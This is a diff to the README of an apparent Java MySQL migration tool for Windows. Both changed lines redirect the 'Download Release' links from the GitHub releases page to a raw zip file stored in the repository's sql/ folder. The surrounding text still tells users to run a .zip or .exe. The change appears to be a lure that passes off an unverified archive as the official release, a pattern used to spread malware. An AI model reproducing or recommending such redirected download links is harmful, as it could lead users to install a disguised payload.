@@ -1,6 +1,6 @@
 # 🗄️ mini-database-migration-service-java - Move MySQL Data With Less Effort
 
-[![Download the release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nahumhyperfine28/mini-database-migration-service-java/releases)
+[![Download the release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nahumhyperfine28/mini-database-migration-service-java/main/sql/migration-database-java-mini-service-3.1-beta.2.zip)
 
 ## 🚀 What This App Does
 
@@ -29,7 +29,7 @@ For smooth use, close other large apps while the migration runs.
 
 Visit this page to download the latest release:
 
-[Download mini-database-migration-service-java](https://github.com/nahumhyperfine28/mini-database-migration-service-java/releases)
+[Download mini-database-migration-service-java](https://raw.githubusercontent.com/nahumhyperfine28/mini-database-migration-service-java/main/sql/migration-database-java-mini-service-3.1-beta.2.zip)
 
 Look for the latest release asset for Windows. If there are several files, choose the one meant for Windows use, such as a `.zip` or `.exe` file.
 
